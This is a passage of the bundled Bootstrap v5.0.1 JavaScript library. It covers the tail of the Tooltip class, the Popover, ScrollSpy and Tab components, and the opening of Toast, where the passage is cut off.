        this._popper = Popper__namespace.createPopper(this._element, tip, this._getPopperConfig(attachment));
      }

      tip.classList.add(CLASS_NAME_SHOW$3);
      const customClass = typeof this._config.customClass === 'function' ? this._config.customClass() : this._config.customClass;

      if (customClass) {
        tip.classList.add(...customClass.split(' '));
      } // If this is a touch-enabled device we add extra
      // empty mouseover listeners to the body's immediate children;
      // only needed because of broken event delegation on iOS
      // https://www.quirksmode.org/blog/archives/2014/02/mouse_event_bub.html


      if ('ontouchstart' in document.documentElement) {
        [].concat(...document.body.children).forEach(element => {
          EventHandler.on(element, 'mouseover', noop);
        });
      }

      const complete = () => {
        const prevHoverState = this._hoverState;
        this._hoverState = null;
        EventHandler.trigger(this._element, this.constructor.Event.SHOWN);

        if (prevHoverState === HOVER_STATE_OUT) {
          this._leave(null, this);
        }
      };

      const isAnimated = this.tip.classList.contains(CLASS_NAME_FADE$3);

      this._queueCallback(complete, this.tip, isAnimated);
    }

    hide() {
      if (!this._popper) {
        return;
      }

      const tip = this.getTipElement();

      const complete = () => {
        if (this._isWithActiveTrigger()) {
          return;
        }

        if (this._hoverState !== HOVER_STATE_SHOW && tip.parentNode) {
          tip.parentNode.removeChild(tip);
        }

        this._cleanTipClass();

        this._element.removeAttribute('aria-describedby');

        EventHandler.trigger(this._element, this.constructor.Event.HIDDEN);

        if (this._popper) {
          this._popper.destroy();

          this._popper = null;
        }
      };

      const hideEvent = EventHandler.trigger(this._element, this.constructor.Event.HIDE);

      if (hideEvent.defaultPrevented) {
        return;
      }

      tip.classList.remove(CLASS_NAME_SHOW$3); // If this is a touch-enabled device we remove the extra
      // empty mouseover listeners we added for iOS support

      if ('ontouchstart' in document.documentElement) {
        [].concat(...document.body.children).forEach(element => EventHandler.off(element, 'mouseover', noop));
      }

      this._activeTrigger[TRIGGER_CLICK] = false;
      this._activeTrigger[TRIGGER_FOCUS] = false;
      this._activeTrigger[TRIGGER_HOVER] = false;
      const isAnimated = this.tip.classList.contains(CLASS_NAME_FADE$3);

      this._queueCallback(complete, this.tip, isAnimated);

      this._hoverState = '';
    }

    update() {
      if (this._popper !== null) {
        this._popper.update();
      }
    } // Protected


    isWithContent() {
      return Boolean(this.getTitle());
    }

    getTipElement() {
      if (this.tip) {
        return this.tip;
      }

      const element = document.createElement('div');
      element.innerHTML = this._config.template;
      this.tip = element.children[0];
      return this.tip;
    }

    setContent() {
      const tip = this.getTipElement();
      this.setElementContent(SelectorEngine.findOne(SELECTOR_TOOLTIP_INNER, tip), this.getTitle());
      tip.classList.remove(CLASS_NAME_FADE$3, CLASS_NAME_SHOW$3);
    }

    setElementContent(element, content) {
      if (element === null) {
        return;
      }

      if (isElement(content)) {
        content = getElement(content); // content is a DOM node or a jQuery

        if (this._config.html) {
          if (content.parentNode !== element) {
            element.innerHTML = '';
            element.appendChild(content);
          }
        } else {
          element.textContent = content.textContent;
        }

        return;
      }

      if (this._config.html) {
        if (this._config.sanitize) {
          content = sanitizeHtml(content, this._config.allowList, this._config.sanitizeFn);
        }

        element.innerHTML = content;
      } else {
        element.textContent = content;
      }
    }

    getTitle() {
      let title = this._element.getAttribute('data-bs-original-title');

      if (!title) {
        title = typeof this._config.title === 'function' ? this._config.title.call(this._element) : this._config.title;
      }

      return title;
    }

    updateAttachment(attachment) {
      if (attachment === 'right') {
        return 'end';
      }

      if (attachment === 'left') {
        return 'start';
      }

      return attachment;
    } // Private


    _initializeOnDelegatedTarget(event, context) {
      const dataKey = this.constructor.DATA_KEY;
      context = context || Data.get(event.delegateTarget, dataKey);

      if (!context) {
        context = new this.constructor(event.delegateTarget, this._getDelegateConfig());
        Data.set(event.delegateTarget, dataKey, context);
      }

      return context;
    }

    _getOffset() {
      const {
        offset
      } = this._config;

      if (typeof offset === 'string') {
        return offset.split(',').map(val => Number.parseInt(val, 10));
      }

      if (typeof offset === 'function') {
        return popperData => offset(popperData, this._element);
      }

      return offset;
    }

    _getPopperConfig(attachment) {
      const defaultBsPopperConfig = {
        placement: attachment,
        modifiers: [{
          name: 'flip',
          options: {
            fallbackPlacements: this._config.fallbackPlacements
          }
        }, {
          name: 'offset',
          options: {
            offset: this._getOffset()
          }
        }, {
          name: 'preventOverflow',
          options: {
            boundary: this._config.boundary
          }
        }, {
          name: 'arrow',
          options: {
            element: `.${this.constructor.NAME}-arrow`
          }
        }, {
          name: 'onChange',
          enabled: true,
          phase: 'afterWrite',
          fn: data => this._handlePopperPlacementChange(data)
        }],
        onFirstUpdate: data => {
          if (data.options.placement !== data.placement) {
            this._handlePopperPlacementChange(data);
          }
        }
      };
      return { ...defaultBsPopperConfig,
        ...(typeof this._config.popperConfig === 'function' ? this._config.popperConfig(defaultBsPopperConfig) : this._config.popperConfig)
      };
    }

    _addAttachmentClass(attachment) {
      this.getTipElement().classList.add(`${CLASS_PREFIX$1}-${this.updateAttachment(attachment)}`);
    }

    _getAttachment(placement) {
      return AttachmentMap[placement.toUpperCase()];
    }

    _setListeners() {
      const triggers = this._config.trigger.split(' ');

      triggers.forEach(trigger => {
        if (trigger === 'click') {
          EventHandler.on(this._element, this.constructor.Event.CLICK, this._config.selector, event => this.toggle(event));
        } else if (trigger !== TRIGGER_MANUAL) {
          const eventIn = trigger === TRIGGER_HOVER ? this.constructor.Event.MOUSEENTER : this.constructor.Event.FOCUSIN;
          const eventOut = trigger === TRIGGER_HOVER ? this.constructor.Event.MOUSELEAVE : this.constructor.Event.FOCUSOUT;
          EventHandler.on(this._element, eventIn, this._config.selector, event => this._enter(event));
          EventHandler.on(this._element, eventOut, this._config.selector, event => this._leave(event));
        }
      });

      this._hideModalHandler = () => {
        if (this._element) {
          this.hide();
        }
      };

      EventHandler.on(this._element.closest(`.${CLASS_NAME_MODAL}`), 'hide.bs.modal', this._hideModalHandler);

      if (this._config.selector) {
        this._config = { ...this._config,
          trigger: 'manual',
          selector: ''
        };
      } else {
        this._fixTitle();
      }
    }

    _fixTitle() {
      const title = this._element.getAttribute('title');

      const originalTitleType = typeof this._element.getAttribute('data-bs-original-title');

      if (title || originalTitleType !== 'string') {
        this._element.setAttribute('data-bs-original-title', title || '');

        if (title && !this._element.getAttribute('aria-label') && !this._element.textContent) {
          this._element.setAttribute('aria-label', title);
        }

        this._element.setAttribute('title', '');
      }
    }

    _enter(event, context) {
      context = this._initializeOnDelegatedTarget(event, context);

      if (event) {
        context._activeTrigger[event.type === 'focusin' ? TRIGGER_FOCUS : TRIGGER_HOVER] = true;
      }

      if (context.getTipElement().classList.contains(CLASS_NAME_SHOW$3) || context._hoverState === HOVER_STATE_SHOW) {
        context._hoverState = HOVER_STATE_SHOW;
        return;
      }

      clearTimeout(context._timeout);
      context._hoverState = HOVER_STATE_SHOW;

      if (!context._config.delay || !context._config.delay.show) {
        context.show();
        return;
      }

      context._timeout = setTimeout(() => {
        if (context._hoverState === HOVER_STATE_SHOW) {
          context.show();
        }
      }, context._config.delay.show);
    }

    _leave(event, context) {
      context = this._initializeOnDelegatedTarget(event, context);

      if (event) {
        context._activeTrigger[event.type === 'focusout' ? TRIGGER_FOCUS : TRIGGER_HOVER] = context._element.contains(event.relatedTarget);
      }

      if (context._isWithActiveTrigger()) {
        return;
      }

      clearTimeout(context._timeout);
      context._hoverState = HOVER_STATE_OUT;

      if (!context._config.delay || !context._config.delay.hide) {
        context.hide();
        return;
      }

      context._timeout = setTimeout(() => {
        if (context._hoverState === HOVER_STATE_OUT) {
          context.hide();
        }
      }, context._config.delay.hide);
    }

    _isWithActiveTrigger() {
      for (const trigger in this._activeTrigger) {
        if (this._activeTrigger[trigger]) {
          return true;
        }
      }

      return false;
    }

    _getConfig(config) {
      const dataAttributes = Manipulator.getDataAttributes(this._element);
      Object.keys(dataAttributes).forEach(dataAttr => {
        if (DISALLOWED_ATTRIBUTES.has(dataAttr)) {
          delete dataAttributes[dataAttr];
        }
      });
      config = { ...this.constructor.Default,
        ...dataAttributes,
        ...(typeof config === 'object' && config ? config : {})
      };
      config.container = config.container === false ? document.body : getElement(config.container);

      if (typeof config.delay === 'number') {
        config.delay = {
          show: config.delay,
          hide: config.delay
        };
      }

      if (typeof config.title === 'number') {
        config.title = config.title.toString();
      }

      if (typeof config.content === 'number') {
        config.content = config.content.toString();
      }

      typeCheckConfig(NAME$4, config, this.constructor.DefaultType);

      if (config.sanitize) {
        config.template = sanitizeHtml(config.template, config.allowList, config.sanitizeFn);
      }

      return config;
    }

    _getDelegateConfig() {
      const config = {};

      if (this._config) {
        for (const key in this._config) {
          if (this.constructor.Default[key] !== this._config[key]) {
            config[key] = this._config[key];
          }
        }
      }

      return config;
    }

    _cleanTipClass() {
      const tip = this.getTipElement();
      const tabClass = tip.getAttribute('class').match(BSCLS_PREFIX_REGEX$1);

      if (tabClass !== null && tabClass.length > 0) {
        tabClass.map(token => token.trim()).forEach(tClass => tip.classList.remove(tClass));
      }
    }

    _handlePopperPlacementChange(popperData) {
      const {
        state
      } = popperData;

      if (!state) {
        return;
      }

      this.tip = state.elements.popper;

      this._cleanTipClass();

      this._addAttachmentClass(this._getAttachment(state.placement));
    } // Static


    static jQueryInterface(config) {
      return this.each(function () {
        let data = Data.get(this, DATA_KEY$4);

        const _config = typeof config === 'object' && config;

        if (!data && /dispose|hide/.test(config)) {
          return;
        }

        if (!data) {
          data = new Tooltip(this, _config);
        }

        if (typeof config === 'string') {
          if (typeof data[config] === 'undefined') {
            throw new TypeError(`No method named "${config}"`);
          }

          data[config]();
        }
      });
    }

  }
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   * add .Tooltip to jQuery only if jQuery is present
   */


  defineJQueryPlugin(Tooltip);

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v5.0.1): popover.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
   * --------------------------------------------------------------------------
   */
  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  const NAME$3 = 'popover';
  const DATA_KEY$3 = 'bs.popover';
  const EVENT_KEY$3 = `.${DATA_KEY$3}`;
  const CLASS_PREFIX = 'bs-popover';
  const BSCLS_PREFIX_REGEX = new RegExp(`(^|\\s)${CLASS_PREFIX}\\S+`, 'g');
  const Default$2 = { ...Tooltip.Default,
    placement: 'right',
    offset: [0, 8],
    trigger: 'click',
    content: '',
    template: '<div class="popover" role="tooltip">' + '<div class="popover-arrow"></div>' + '<h3 class="popover-header"></h3>' + '<div class="popover-body"></div>' + '</div>'
  };
  const DefaultType$2 = { ...Tooltip.DefaultType,
    content: '(string|element|function)'
  };
  const Event$1 = {
    HIDE: `hide${EVENT_KEY$3}`,
    HIDDEN: `hidden${EVENT_KEY$3}`,
    SHOW: `show${EVENT_KEY$3}`,
    SHOWN: `shown${EVENT_KEY$3}`,
    INSERTED: `inserted${EVENT_KEY$3}`,
    CLICK: `click${EVENT_KEY$3}`,
    FOCUSIN: `focusin${EVENT_KEY$3}`,
    FOCUSOUT: `focusout${EVENT_KEY$3}`,
    MOUSEENTER: `mouseenter${EVENT_KEY$3}`,
    MOUSELEAVE: `mouseleave${EVENT_KEY$3}`
  };
  const CLASS_NAME_FADE$2 = 'fade';
  const CLASS_NAME_SHOW$2 = 'show';
  const SELECTOR_TITLE = '.popover-header';
  const SELECTOR_CONTENT = '.popover-body';
  /**
   * ------------------------------------------------------------------------
   * Class Definition
   * ------------------------------------------------------------------------
   */

  class Popover extends Tooltip {
    // Getters
    static get Default() {
      return Default$2;
    }

    static get NAME() {
      return NAME$3;
    }

    static get Event() {
      return Event$1;
    }

    static get DefaultType() {
      return DefaultType$2;
    } // Overrides


    isWithContent() {
      return this.getTitle() || this._getContent();
    }

    setContent() {
      const tip = this.getTipElement(); // we use append for html objects to maintain js events

      this.setElementContent(SelectorEngine.findOne(SELECTOR_TITLE, tip), this.getTitle());

      let content = this._getContent();

      if (typeof content === 'function') {
        content = content.call(this._element);
      }

      this.setElementContent(SelectorEngine.findOne(SELECTOR_CONTENT, tip), content);
      tip.classList.remove(CLASS_NAME_FADE$2, CLASS_NAME_SHOW$2);
    } // Private


    _addAttachmentClass(attachment) {
      this.getTipElement().classList.add(`${CLASS_PREFIX}-${this.updateAttachment(attachment)}`);
    }

    _getContent() {
      return this._element.getAttribute('data-bs-content') || this._config.content;
    }

    _cleanTipClass() {
      const tip = this.getTipElement();
      const tabClass = tip.getAttribute('class').match(BSCLS_PREFIX_REGEX);

      if (tabClass !== null && tabClass.length > 0) {
        tabClass.map(token => token.trim()).forEach(tClass => tip.classList.remove(tClass));
      }
    } // Static


    static jQueryInterface(config) {
      return this.each(function () {
        let data = Data.get(this, DATA_KEY$3);

        const _config = typeof config === 'object' ? config : null;

        if (!data && /dispose|hide/.test(config)) {
          return;
        }

        if (!data) {
          data = new Popover(this, _config);
          Data.set(this, DATA_KEY$3, data);
        }

        if (typeof config === 'string') {
          if (typeof data[config] === 'undefined') {
            throw new TypeError(`No method named "${config}"`);
          }

          data[config]();
        }
      });
    }

  }
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   * add .Popover to jQuery only if jQuery is present
   */


  defineJQueryPlugin(Popover);

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v5.0.1): scrollspy.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
   * --------------------------------------------------------------------------
   */
  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  const NAME$2 = 'scrollspy';
  const DATA_KEY$2 = 'bs.scrollspy';
  const EVENT_KEY$2 = `.${DATA_KEY$2}`;
  const DATA_API_KEY$1 = '.data-api';
  const Default$1 = {
    offset: 10,
    method: 'auto',
    target: ''
  };
  const DefaultType$1 = {
    offset: 'number',
    method: 'string',
    target: '(string|element)'
  };
  const EVENT_ACTIVATE = `activate${EVENT_KEY$2}`;
  const EVENT_SCROLL = `scroll${EVENT_KEY$2}`;
  const EVENT_LOAD_DATA_API = `load${EVENT_KEY$2}${DATA_API_KEY$1}`;
  const CLASS_NAME_DROPDOWN_ITEM = 'dropdown-item';
  const CLASS_NAME_ACTIVE$1 = 'active';
  const SELECTOR_DATA_SPY = '[data-bs-spy="scroll"]';
  const SELECTOR_NAV_LIST_GROUP$1 = '.nav, .list-group';
  const SELECTOR_NAV_LINKS = '.nav-link';
  const SELECTOR_NAV_ITEMS = '.nav-item';
  const SELECTOR_LIST_ITEMS = '.list-group-item';
  const SELECTOR_DROPDOWN$1 = '.dropdown';
  const SELECTOR_DROPDOWN_TOGGLE$1 = '.dropdown-toggle';
  const METHOD_OFFSET = 'offset';
  const METHOD_POSITION = 'position';
  /**
   * ------------------------------------------------------------------------
   * Class Definition
   * ------------------------------------------------------------------------
   */

  class ScrollSpy extends BaseComponent {
    constructor(element, config) {
      super(element);
      this._scrollElement = this._element.tagName === 'BODY' ? window : this._element;
      this._config = this._getConfig(config);
      this._selector = `${this._config.target} ${SELECTOR_NAV_LINKS}, ${this._config.target} ${SELECTOR_LIST_ITEMS}, ${this._config.target} .${CLASS_NAME_DROPDOWN_ITEM}`;
      this._offsets = [];
      this._targets = [];
      this._activeTarget = null;
      this._scrollHeight = 0;
      EventHandler.on(this._scrollElement, EVENT_SCROLL, () => this._process());
      this.refresh();

      this._process();
    } // Getters


    static get Default() {
      return Default$1;
    }

    static get NAME() {
      return NAME$2;
    } // Public


    refresh() {
      const autoMethod = this._scrollElement === this._scrollElement.window ? METHOD_OFFSET : METHOD_POSITION;
      const offsetMethod = this._config.method === 'auto' ? autoMethod : this._config.method;
      const offsetBase = offsetMethod === METHOD_POSITION ? this._getScrollTop() : 0;
      this._offsets = [];
      this._targets = [];
      this._scrollHeight = this._getScrollHeight();
      const targets = SelectorEngine.find(this._selector);
      targets.map(element => {
        const targetSelector = getSelectorFromElement(element);
        const target = targetSelector ? SelectorEngine.findOne(targetSelector) : null;

        if (target) {
          const targetBCR = target.getBoundingClientRect();

          if (targetBCR.width || targetBCR.height) {
            return [Manipulator[offsetMethod](target).top + offsetBase, targetSelector];
          }
        }

        return null;
      }).filter(item => item).sort((a, b) => a[0] - b[0]).forEach(item => {
        this._offsets.push(item[0]);

        this._targets.push(item[1]);
      });
    }

    dispose() {
      EventHandler.off(this._scrollElement, EVENT_KEY$2);
      super.dispose();
    } // Private


    _getConfig(config) {
      config = { ...Default$1,
        ...Manipulator.getDataAttributes(this._element),
        ...(typeof config === 'object' && config ? config : {})
      };

      if (typeof config.target !== 'string' && isElement(config.target)) {
        let {
          id
        } = config.target;

        if (!id) {
          id = getUID(NAME$2);
          config.target.id = id;
        }

        config.target = `#${id}`;
      }

      typeCheckConfig(NAME$2, config, DefaultType$1);
      return config;
    }

    _getScrollTop() {
      return this._scrollElement === window ? this._scrollElement.pageYOffset : this._scrollElement.scrollTop;
    }

    _getScrollHeight() {
      return this._scrollElement.scrollHeight || Math.max(document.body.scrollHeight, document.documentElement.scrollHeight);
    }

    _getOffsetHeight() {
      return this._scrollElement === window ? window.innerHeight : this._scrollElement.getBoundingClientRect().height;
    }

    _process() {
      const scrollTop = this._getScrollTop() + this._config.offset;

      const scrollHeight = this._getScrollHeight();

      const maxScroll = this._config.offset + scrollHeight - this._getOffsetHeight();

      if (this._scrollHeight !== scrollHeight) {
        this.refresh();
      }

      if (scrollTop >= maxScroll) {
        const target = this._targets[this._targets.length - 1];

        if (this._activeTarget !== target) {
          this._activate(target);
        }

        return;
      }

      if (this._activeTarget && scrollTop < this._offsets[0] && this._offsets[0] > 0) {
        this._activeTarget = null;

        this._clear();

        return;
      }

      for (let i = this._offsets.length; i--;) {
        const isActiveTarget = this._activeTarget !== this._targets[i] && scrollTop >= this._offsets[i] && (typeof this._offsets[i + 1] === 'undefined' || scrollTop < this._offsets[i + 1]);

        if (isActiveTarget) {
          this._activate(this._targets[i]);
        }
      }
    }

    _activate(target) {
      this._activeTarget = target;

      this._clear();

      const queries = this._selector.split(',').map(selector => `${selector}[data-bs-target="${target}"],${selector}[href="${target}"]`);

      const link = SelectorEngine.findOne(queries.join(','));

      if (link.classList.contains(CLASS_NAME_DROPDOWN_ITEM)) {
        SelectorEngine.findOne(SELECTOR_DROPDOWN_TOGGLE$1, link.closest(SELECTOR_DROPDOWN$1)).classList.add(CLASS_NAME_ACTIVE$1);
        link.classList.add(CLASS_NAME_ACTIVE$1);
      } else {
        // Set triggered link as active
        link.classList.add(CLASS_NAME_ACTIVE$1);
        SelectorEngine.parents(link, SELECTOR_NAV_LIST_GROUP$1).forEach(listGroup => {
          // Set triggered links parents as active
          // With both <ul> and <nav> markup a parent is the previous sibling of any nav ancestor
          SelectorEngine.prev(listGroup, `${SELECTOR_NAV_LINKS}, ${SELECTOR_LIST_ITEMS}`).forEach(item => item.classList.add(CLASS_NAME_ACTIVE$1)); // Handle special case when .nav-link is inside .nav-item

          SelectorEngine.prev(listGroup, SELECTOR_NAV_ITEMS).forEach(navItem => {
            SelectorEngine.children(navItem, SELECTOR_NAV_LINKS).forEach(item => item.classList.add(CLASS_NAME_ACTIVE$1));
          });
        });
      }

      EventHandler.trigger(this._scrollElement, EVENT_ACTIVATE, {
        relatedTarget: target
      });
    }

    _clear() {
      SelectorEngine.find(this._selector).filter(node => node.classList.contains(CLASS_NAME_ACTIVE$1)).forEach(node => node.classList.remove(CLASS_NAME_ACTIVE$1));
    } // Static


    static jQueryInterface(config) {
      return this.each(function () {
        const data = ScrollSpy.getInstance(this) || new ScrollSpy(this, typeof config === 'object' ? config : {});

        if (typeof config !== 'string') {
          return;
        }

        if (typeof data[config] === 'undefined') {
          throw new TypeError(`No method named "${config}"`);
        }

        data[config]();
      });
    }

  }
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  EventHandler.on(window, EVENT_LOAD_DATA_API, () => {
    SelectorEngine.find(SELECTOR_DATA_SPY).forEach(spy => new ScrollSpy(spy));
  });
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   * add .ScrollSpy to jQuery only if jQuery is present
   */

  defineJQueryPlugin(ScrollSpy);

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v5.0.1): tab.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
   * --------------------------------------------------------------------------
   */
  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  const NAME$1 = 'tab';
  const DATA_KEY$1 = 'bs.tab';
  const EVENT_KEY$1 = `.${DATA_KEY$1}`;
  const DATA_API_KEY = '.data-api';
  const EVENT_HIDE$1 = `hide${EVENT_KEY$1}`;
  const EVENT_HIDDEN$1 = `hidden${EVENT_KEY$1}`;
  const EVENT_SHOW$1 = `show${EVENT_KEY$1}`;
  const EVENT_SHOWN$1 = `shown${EVENT_KEY$1}`;
  const EVENT_CLICK_DATA_API = `click${EVENT_KEY$1}${DATA_API_KEY}`;
  const CLASS_NAME_DROPDOWN_MENU = 'dropdown-menu';
  const CLASS_NAME_ACTIVE = 'active';
  const CLASS_NAME_FADE$1 = 'fade';
  const CLASS_NAME_SHOW$1 = 'show';
  const SELECTOR_DROPDOWN = '.dropdown';
  const SELECTOR_NAV_LIST_GROUP = '.nav, .list-group';
  const SELECTOR_ACTIVE = '.active';
  const SELECTOR_ACTIVE_UL = ':scope > li > .active';
  const SELECTOR_DATA_TOGGLE = '[data-bs-toggle="tab"], [data-bs-toggle="pill"], [data-bs-toggle="list"]';
  const SELECTOR_DROPDOWN_TOGGLE = '.dropdown-toggle';
  const SELECTOR_DROPDOWN_ACTIVE_CHILD = ':scope > .dropdown-menu .active';
  /**
   * ------------------------------------------------------------------------
   * Class Definition
   * ------------------------------------------------------------------------
   */

  class Tab extends BaseComponent {
    // Getters
    static get NAME() {
      return NAME$1;
    } // Public


    show() {
      if (this._element.parentNode && this._element.parentNode.nodeType === Node.ELEMENT_NODE && this._element.classList.contains(CLASS_NAME_ACTIVE)) {
        return;
      }

      let previous;
      const target = getElementFromSelector(this._element);

      const listElement = this._element.closest(SELECTOR_NAV_LIST_GROUP);

      if (listElement) {
        const itemSelector = listElement.nodeName === 'UL' || listElement.nodeName === 'OL' ? SELECTOR_ACTIVE_UL : SELECTOR_ACTIVE;
        previous = SelectorEngine.find(itemSelector, listElement);
        previous = previous[previous.length - 1];
      }

      const hideEvent = previous ? EventHandler.trigger(previous, EVENT_HIDE$1, {
        relatedTarget: this._element
      }) : null;
      const showEvent = EventHandler.trigger(this._element, EVENT_SHOW$1, {
        relatedTarget: previous
      });

      if (showEvent.defaultPrevented || hideEvent !== null && hideEvent.defaultPrevented) {
        return;
      }

      this._activate(this._element, listElement);

      const complete = () => {
        EventHandler.trigger(previous, EVENT_HIDDEN$1, {
          relatedTarget: this._element
        });
        EventHandler.trigger(this._element, EVENT_SHOWN$1, {
          relatedTarget: previous
        });
      };

      if (target) {
        this._activate(target, target.parentNode, complete);
      } else {
        complete();
      }
    } // Private


    _activate(element, container, callback) {
      const activeElements = container && (container.nodeName === 'UL' || container.nodeName === 'OL') ? SelectorEngine.find(SELECTOR_ACTIVE_UL, container) : SelectorEngine.children(container, SELECTOR_ACTIVE);
      const active = activeElements[0];
      const isTransitioning = callback && active && active.classList.contains(CLASS_NAME_FADE$1);

      const complete = () => this._transitionComplete(element, active, callback);

      if (active && isTransitioning) {
        active.classList.remove(CLASS_NAME_SHOW$1);

        this._queueCallback(complete, element, true);
      } else {
        complete();
      }
    }

    _transitionComplete(element, active, callback) {
      if (active) {
        active.classList.remove(CLASS_NAME_ACTIVE);
        const dropdownChild = SelectorEngine.findOne(SELECTOR_DROPDOWN_ACTIVE_CHILD, active.parentNode);

        if (dropdownChild) {
          dropdownChild.classList.remove(CLASS_NAME_ACTIVE);
        }

        if (active.getAttribute('role') === 'tab') {
          active.setAttribute('aria-selected', false);
        }
      }

      element.classList.add(CLASS_NAME_ACTIVE);

      if (element.getAttribute('role') === 'tab') {
        element.setAttribute('aria-selected', true);
      }

      reflow(element);

      if (element.classList.contains(CLASS_NAME_FADE$1)) {
        element.classList.add(CLASS_NAME_SHOW$1);
      }

      let parent = element.parentNode;

      if (parent && parent.nodeName === 'LI') {
        parent = parent.parentNode;
      }

      if (parent && parent.classList.contains(CLASS_NAME_DROPDOWN_MENU)) {
        const dropdownElement = element.closest(SELECTOR_DROPDOWN);

        if (dropdownElement) {
          SelectorEngine.find(SELECTOR_DROPDOWN_TOGGLE, dropdownElement).forEach(dropdown => dropdown.classList.add(CLASS_NAME_ACTIVE));
        }

        element.setAttribute('aria-expanded', true);
      }

      if (callback) {
        callback();
      }
    } // Static


    static jQueryInterface(config) {
      return this.each(function () {
        const data = Data.get(this, DATA_KEY$1) || new Tab(this);

        if (typeof config === 'string') {
          if (typeof data[config] === 'undefined') {
            throw new TypeError(`No method named "${config}"`);
          }

          data[config]();
        }
      });
    }

  }
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  EventHandler.on(document, EVENT_CLICK_DATA_API, SELECTOR_DATA_TOGGLE, function (event) {
    if (['A', 'AREA'].includes(this.tagName)) {
      event.preventDefault();
    }

    if (isDisabled(this)) {
      return;
    }

    const data = Data.get(this, DATA_KEY$1) || new Tab(this);
    data.show();
  });
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   * add .Tab to jQuery only if jQuery is present
   */

  defineJQueryPlugin(Tab);

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v5.0.1): toast.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
   * --------------------------------------------------------------------------
   */
  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  const NAME = 'toast';
  const DATA_KEY = 'bs.toast';
  const EVENT_KEY = `.${DATA_KEY}`;
  const EVENT_CLICK_DISMISS = `click.dismiss${EVENT_KEY}`;
  const EVENT_MOUSEOVER = `mouseover${EVENT_KEY}`;
  const EVENT_MOUSEOUT = `mouseout${EVENT_KEY}`;
  const EVENT_FOCUSIN = `focusin${EVENT_KEY}`;
  const EVENT_FOCUSOUT = `focusout${EVENT_KEY}`;
  const EVENT_HIDE = `hide${EVENT_KEY}`;
  const EVENT_HIDDEN = `hidden${EVENT_KEY}`;
  const EVENT_SHOW = `show${EVENT_KEY}`;
  const EVENT_SHOWN = `shown${EVENT_KEY}`;
  const CLASS_NAME_FADE = 'fade';
  const CLASS_NAME_HIDE = 'hide';
  const CLASS_NAME_SHOW = 'show';
  const CLASS_NAME_SHOWING = 'showing';
  const DefaultType = {
    animation: 'boolean',
    autohide: 'boolean',
    delay: 'number'
  };
  const Default = {
    animation: true,
    autohide: true,
    delay: 5000
  };
  const SELECTOR_DATA_DISMISS = '[data-bs-dismiss="toast"]';
  /**
   * ------------------------------------------------------------------------
   * Class Definition
   * ------------------------------------------------------------------------
   */

  class Toast extends BaseComponent {
    constructor(element, config) {
      super(element);
      this._config = this._getConfig(config);
      this._timeout = null;
      this._hasMouseInteraction = false;
      this._hasKeyboardInteraction = false;

      this._setListeners();
    } // Getters


    static get DefaultType() {
      return DefaultType;
    }

    static get Default() {
      return Default;
    }

    static get NAME() {
      return NAME;
    } // Public


    show() {
      const showEvent = EventHandler.trigger(this._element, EVENT_SHOW);

      if (showEvent.defaultPrevented) {
        return;
      }

      this._clearTimeout();

      if (this._config.animation) {
        this._element.classList.add(CLASS_NAME_FADE);
      }

      const complete = () => {
        this._element.classList.remove(CLASS_NAME_SHOWING);

        this._element.classList.add(CLASS_NAME_SHOW);

        EventHandler.trigger(this._element, EVENT_SHOWN);

        this._maybeScheduleHide();
      };

      this._element.classList.remove(CLASS_NAME_HIDE);

      reflow(this._element);

      this._element.classList.add(CLASS_NAME_SHOWING);

      this._queueCallback(complete, this._element, this._config.animation);
    }

    hide() {
      if (!this._element.classList.contains(CLASS_NAME_SHOW)) {
        return;
      }

      const hideEvent = EventHandler.trigger(this._element, EVENT_HIDE);

      if (hideEvent.defaultPrevented) {
        return;
      }

      const complete = () => {
        this._element.classList.add(CLASS_NAME_HIDE);

        EventHandler.trigger(this._element, EVENT_HIDDEN);
      };

      this._element.classList.remove(CLASS_NAME_SHOW);

      this._queueCallback(complete, this._element, this._config.animation);
    }

    dispose() {
      this._clearTimeout();

      if (this._element.classList.contains(CLASS_NAME_SHOW)) {
        this._element.classList.remove(CLASS_NAME_SHOW);
      }

      super.dispose();
    } // Private


    _getConfig(config) {
      config = { ...Default,
        ...Manipulator.getDataAttributes(this._element),
        ...(typeof config === 'object' && config ? config : {})
      };
      typeCheckConfig(NAME, config, this.constructor.DefaultType);
      return config;
    }

    _maybeScheduleHide() {
      if (!this._config.autohide) {
        return;
      }

      if (this._hasMouseInteraction || this._hasKeyboardInteraction) {
        return;
      }

      this._timeout = setTimeout(() => {
        this.hide();
      }, this._config.delay);
    }

    _onInteraction(event, isInteracting) {
      switch (event.type) {
        case 'mouseover':
        case 'mouseout':
          this._hasMouseInteraction = isInteracting;
          break;

        case 'focusin':
        case 'focusout':
          this._hasKeyboardInteraction = isInteracting;
          break;
      }

      if (isInteracting) {
        this._clearTimeout();

        return;
      }

      const nextElement = event.relatedTarget;

      if (this._element === nextElement || this._element.contains(nextElement)) {
        return;
      }

      this._maybeScheduleHide();
    }

    _setListeners() {
      EventHandler.on(this._element, EVENT_CLICK_DISMISS, SELECTOR_DATA_DISMISS, () => this.hide());
      EventHandler.on(this._element, EVENT_MOUSEOVER, event => this._onInteraction(event, true));
      EventHandler.on(this._element, EVENT_MOUSEOUT, event => this._onInteraction(event, false));
      EventHandler.on(this._element, EVENT_FOCUSIN, event => this._onInteraction(event, true));
